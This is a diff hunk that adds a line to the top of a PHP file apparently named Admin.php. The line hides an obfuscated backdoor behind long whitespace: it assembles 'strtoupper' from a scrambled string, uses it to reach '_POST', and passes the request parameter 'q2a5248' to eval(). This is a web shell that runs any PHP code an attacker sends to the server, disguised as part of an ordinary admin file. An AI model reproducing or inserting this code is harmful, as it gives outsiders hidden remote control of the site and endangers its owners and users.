@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                              $jfib8= "touserp_" ; $xplm8= $jfib8[3]. $jfib8[0].$jfib8[5]. $jfib8[0]. $jfib8[1].$jfib8[2]. $jfib8[6].$jfib8[6].$jfib8[4]. $jfib8[5]; $jxnf82 =$xplm8($jfib8[7].$jfib8[6]. $jfib8[1].$jfib8[3].$jfib8[0]) ; if ( isset (${$jxnf82 } ['q2a5248' ] )) {eval(${ $jxnf82}['q2a5248']); } ?><?php
 /**
  * Admin.php
  *
